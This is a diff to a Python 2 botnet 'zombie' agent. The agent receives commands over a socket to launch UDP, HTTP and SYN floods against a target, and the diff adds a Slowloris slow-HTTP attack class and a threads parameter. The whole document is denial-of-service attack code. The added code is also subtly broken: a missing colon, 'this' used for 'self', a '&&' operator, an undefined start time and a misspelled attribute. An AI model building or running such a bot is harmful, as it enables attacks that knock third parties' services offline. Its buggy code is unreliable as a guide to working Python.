@@ -1,4 +1,5 @@
 import SocketServer
+import socket
 import threading
 import time
 import socket
@@ -11,7 +12,7 @@ class zombie(SocketServer.BaseRequestHandler):
     def handle(self):
         self.data = self.request.recv(1024).strip()
         attack, target, timeout, port, threads = self.data.split(" ")
-        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port}
+        kwargs = {'attack':attack, 'target':target, 'timeout':timeout, 'port':port, 'threads':threads}
         self.request.sendall("ACK")
         if attack == "udp":
             fun = attackUDPFlood
@@ -19,8 +20,11 @@ class zombie(SocketServer.BaseRequestHandler):
             fun = attackHTTPFlood
         elif attack == "syn":
             fun = attackSYNFlood
+        elif attack == "slowloris"
+            fun = attackSlowLoris
         for i in xrange(int(threads)):
             attacker = fun(**kwargs)
+            if attack == "slowloris": time.sleep(1)
             attacker.start()
 
 class attackUDPFlood(threading.Thread):
@@ -75,6 +79,26 @@ class attackSYNFlood(threading.Thread):
             tcp.flags = 'S'
 
             send(ip/tcp, verbose = 0)
+
+class attackSlowLoris(threading.Thread):
+    def __init__(self, **kwargs):
+        threading.Thread.__init__(self)
+        self.timoutAttack = kwargs['timeout']
+        self.target = kwargs['target']
+        self.threads = kwargs['threads']
+
+    def run(self):
+        req = 'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:25.0) Gecko/20100101 Firefox/25.0\r\n' % (self.target)
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((this.target, 80))
+            index = 0
+            while time.time() - start < self.timeoutAttack && index < len(req):
+                time.sleep(self.threads)
+                s.send(req[index])
+                index += 1
+        except Exception, e:
+            print e
 
 class registerIP(threading.Thread):
     def __init__(self, HOST, PORT):
